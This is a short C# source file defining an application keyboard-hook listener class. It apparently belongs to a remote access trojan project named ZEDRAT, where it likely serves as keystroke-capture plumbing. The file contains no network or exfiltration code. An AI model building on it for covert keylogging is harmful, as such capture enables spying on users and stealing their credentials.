using System.Collections.Generic;
using ZEDRatApp.ZEDRAT.MouseKeyHook.WinApi;

namespace ZEDRatApp.ZEDRAT.MouseKeyHook.Implementation
{
	internal class AppKeyListener : KeyListener
	{
		public AppKeyListener()
			: base(new Subscribe(HookHelper.HookAppKeyboard))
		{
		}

		protected override IEnumerable<KeyPressEventArgsExt> GetPressEventArgs(CallbackData data)
		{
			return KeyPressEventArgsExt.FromRawDataApp(data);
		}

		protected override KeyEventArgsExt GetDownUpEventArgs(CallbackData data)
		{
			return KeyEventArgsExt.FromRawDataApp(data);
		}
	}
}
